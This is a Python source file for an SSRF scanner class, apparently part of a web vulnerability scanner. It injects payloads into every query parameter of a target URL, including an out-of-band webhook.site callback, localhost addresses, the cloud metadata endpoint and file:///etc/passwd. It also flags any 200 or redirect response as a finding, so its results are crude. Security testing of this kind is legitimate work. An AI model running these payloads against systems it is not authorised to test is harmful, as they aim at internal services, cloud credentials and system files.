import requests
import uuid
from urllib.parse import urlparse, parse_qs, urlencode
from utils.logger import logger

class SSRFScanner:
    def __init__(self):
        self.collaborator_url = f"https://webhook.site/{uuid.uuid4()}"  # Replace with your webhook.site URL
        self.payloads = [
            self.collaborator_url,
            f"http://localhost:80",
            f"http://127.0.0.1",
            f"http://169.254.169.254/latest/meta-data/",
            f"file:///etc/passwd",
        ]
        self.results = []

    def scan(self, url):
        self.results = []
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        for param in query_params:
            for payload in self.payloads:
                new_params = query_params.copy()
                new_params[param] = payload
                new_query = urlencode(new_params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"

                try:
                    response = requests.get(test_url, timeout=5)
                    logger.debug(f"SSRF: {test_url} - Status: {response.status_code}, Length: {len(response.text)}")
                    if response.status_code in [200, 301, 302] or payload in response.text:
                        finding = {
                            "vulnerability": "SSRF",
                            "url": test_url,
                            "payload": payload,
                            "severity": "high",
                            "details": f"Potential SSRF detected with payload: {payload}. Check collaborator logs at {self.collaborator_url}."
                        }
                        self.results.append(finding)
                        logger.info(f"SSRF found: {test_url} with payload: {payload}")
                except requests.RequestException as e:
                    logger.error(f"Error scanning {test_url} for SSRF: {e}")

        return self.results